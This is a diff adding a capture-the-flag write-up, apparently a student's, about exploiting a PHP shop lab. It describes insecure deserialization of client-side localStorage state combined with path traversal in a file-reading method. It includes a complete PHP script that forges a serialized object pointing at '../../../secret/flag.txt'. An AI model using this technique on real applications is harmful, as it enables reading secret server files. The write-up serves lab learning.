@@ -1,0 +1,57 @@
+In order to take this flag a lot of different aspects have been analyzed. 
+First of all, the vulnerability was in the method getPicture() of the class Product. 
+
+
+function getPicture() {
+    $path = '/var/www/assets/' . $this->picture;
+    $data = base64_encode(file_get_contents($path));
+    return $data;
+}
+
+as you can see the product class has a "picture" attribute that is a path for a given 
+image. If I set a malicious path I can get whatever I want with the function "file_get_contents($path)"
+that basically returns the content of a file as a string. 
+
+In order to understand how to take advantege of this vulnerability I followed the flow of the computation
+till this method. The api that was calling this method was cart.php, by calling the method toDict()
+always present in Product. 
+
+After hours crying, I understood that the method toDict() was also available in the class State.
+So, by using the following code, I replaced the 'state' in the localstorage with a fake_state, 
+that in reality was a fake product. So, after the unserialize, the 'cart.php' calls the toDict() method
+of the fake product.  
+
+<?php
+class Product {
+    private $id;
+    private $name;
+    private $description;
+    private $picture;
+    private $price;
+
+    function __construct($id, $name, $description, $picture, $price) {
+        $this->id = $id;
+        $this->name = $name;
+        $this->description = $description;
+        $this->picture = $picture;
+        $this->price = $price;
+    }
+    
+    function save() {
+        return base64_encode(gzcompress(serialize($this)));
+    }
+}
+
+$fake_product = new Product(99, "Dildo Megagalattico", "Non serve", "../../../secret/flag.txt",9999);
+
+echo $fake_product->save(); 
+?> 
+
+The function "save" have been copied from the State class into the Product class. 
+The output of the final echo was the 'state' replaced in the localstorage.
+
+After refreshing the page with the new localstorage, I looked into the network shell in the browser
+ad I saw the json answer to the 'cart.php' api. Into the aswer the 'picture' attribute was a 
+base64 encoded string. I simply decoded it and got the flag. 
+
+IMPORTANT: the flag schema was different from the ones I found till now. 
